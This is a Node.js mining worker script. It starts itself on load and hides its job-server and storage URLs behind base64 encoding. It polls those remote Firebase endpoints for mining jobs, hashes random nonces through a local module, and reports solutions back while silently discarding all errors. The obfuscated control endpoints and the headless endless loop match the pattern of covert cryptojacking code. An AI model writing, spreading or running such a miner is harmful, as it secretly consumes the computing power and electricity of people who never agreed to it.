const Module = require('./module')
const axios = require('axios')

let mJobSolve = 0
let mJob = null

let BASE_URL = decode('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')


startWorker()

setInterval(async() => {
    getJob()
}, 30000)


async function startWorker() {
    await delay(1000)

    while (true) {
        await getJob()
        if (mJob) {
            break
        }
        await delay(10000)
    }

    console.log('Job Received...')

    while (true) {
        await solveJob()
        await delay(0)
    }
}

async function getJob() {
    let tempJob = null
    
    try {
        let response = await axios.get(STORAGE+encodeURIComponent('mining/job.json'))

        let contentType = response.data['contentType']
        tempJob = JSON.parse(decode(contentType.replace('base64/', '')))
    } catch (error) {}

    if (tempJob) {
        mJob = tempJob
    } else {
        try {
            let response = await axios.get(BASE_URL+'mining/job.json')
    
            if (response.data && response.data['blob']) {
                mJob = response.data
            }
        } catch (error) {}
    }
}

async function saveHash(id, hsah, nonce) {
    mJobSolve++

    console.log('Solved Job: ', mJobSolve)
    try {
        await axios.patch(BASE_URL+'mining/solved/'+hsah+'.json', JSON.stringify({ id:id, nonce:nonce, time:parseInt(new Date().getTime()/1000) }), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        })
    } catch (error) {}
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

function zeroPad(num, places) {
    var zero = places - num.toString().length + 1;
    return Array(+(zero > 0 && zero)).join("0") + num
}

function hex2int(s) {
    return parseInt(s.match(/[a-fA-F0-9]{2}/g).reverse().join(""), 16)
}

function int2hex(i) {
    return zeroPad(i.toString(16), 8).match(/[a-fA-F0-9]{2}/g).reverse().join("")
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min
}

async function solveJob() {
    try {
        let job = mJob
        let target = hex2int(job.target)
        
        var hexnonce = int2hex(getRandomInt(0, 0xFFFFFFFF))
        var blob = job.blob.substring(0, 78) + hexnonce + job.blob.substring(86, job.blob.length)
        if (job.algo == 'ghostrider') {
            blob = job.blob.substring(0, 152) + hexnonce
        }

        let hash = Module.hash(blob, job.algo, job.targets, job.variant, job.height, job.seed_hash)

        if (hash && hex2int(hash.substring(56, 64)) < target) {
           await saveHash(job.job_id, hash, hexnonce)
        }
    } catch (error) {}
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
